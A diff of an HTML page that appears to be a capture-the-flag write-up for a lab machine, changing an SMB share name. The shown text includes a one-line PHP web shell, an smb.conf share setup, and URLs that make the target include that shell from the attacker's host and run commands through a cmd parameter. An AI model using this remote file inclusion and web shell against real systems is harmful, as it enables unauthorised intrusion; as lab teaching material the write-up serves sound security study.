@@ -239,7 +239,7 @@ http://10.10.10.151/user/</p>
 <p>This effectively uses a PHP exploit that invovles including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share on my own host as per that server. In the  share I&rsquo;ve got a file called hax.php (yes, I know, Its leet). It contains this:</p>
 <p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
 <p>For posterity the following also reflects the codeblock used in my smb.conf file:</p>
-<pre><code>[ica]
+<pre><code>[share]
 path = /var/www/html/pub
 writable = no
 guest ok = yes
@@ -251,12 +251,12 @@ force user = nobody
 <p><a href="https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e">Sniper Gist by 5ysk3y</a></p>
 <p>To exploit this, we call our malicious file via the SMB share in the url as follows:</p>
 <blockquote>
-<p>http://10.10.10.151/blog/?lang=\10.10.14.34\ica\hax.php</p>
+<p>http://10.10.10.151/blog/?lang=\10.10.14.34\share\hax.php</p>
 </blockquote>
 <p>This returns the HTML elements of the script when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
 <p>From there, we can run commands, e.g:</p>
 <blockquote>
-<p>POST    /blog/?lang=\10.10.14.34\ica\hax.php&amp;cmd=dir+..\user\</p>
+<p>POST    /blog/?lang=\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
 </blockquote>
 <p>To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:</p>
 <pre><code>10/01/2019  08:44 AM    &lt;DIR&gt;          .
